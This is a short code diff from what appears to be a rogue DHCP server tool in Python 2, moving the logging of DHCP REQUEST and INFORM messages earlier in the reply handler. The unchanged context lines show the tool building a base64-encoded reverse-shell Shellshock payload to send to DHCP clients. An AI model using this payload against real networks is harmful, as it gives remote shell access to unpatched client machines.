@@ -196,6 +196,13 @@ def dhcp_reply(request):
             if request[DHCP].options[0][1] == 8:
                 requested_ip = ciaddr
 
+            if request[DHCP].options[0][1] == 3:
+                print "DHCP REQUEST from: " + target_mac_address + " || transaction id: " + hex(transaction_id) + \
+                      " || requested ip: " + requested_ip
+            if request[DHCP].options[0][1] == 8:
+                print "DHCP INFORM from: " + target_mac_address + " || transaction id: " + hex(transaction_id) + \
+                      " || requested ip: " + requested_ip
+
             if IPv4Address(unicode(requested_ip)) < IPv4Address(unicode(args.first_offer_ip)) \
                     or IPv4Address(unicode(requested_ip)) > IPv4Address(unicode(args.last_offer_ip)):
                 nak_packet = make_dhcp_nak_packet(transaction_id, requested_ip)
@@ -225,12 +232,6 @@ def dhcp_reply(request):
                     b64shell = b64encode(net_settings + reverse_shell)
                     shellshock_url = "() { :" + "; }; /bin/sh <(/usr/bin/base64 -d <<< " + b64shell + ")"
 
-                if request[DHCP].options[0][1] == 3:
-                    print "DHCP REQUEST from: " + target_mac_address + " || transaction id: " + hex(transaction_id) + \
-                          " || requested ip: " + requested_ip
-                if request[DHCP].options[0][1] == 8:
-                    print "DHCP INFORM from: " + target_mac_address + " || transaction id: " + hex(transaction_id) + \
-                          " || requested ip: " + requested_ip
 
                 ack_packet = make_dhcp_ack_packet(transaction_id, requested_ip)
                 SOCK.send(ack_packet)
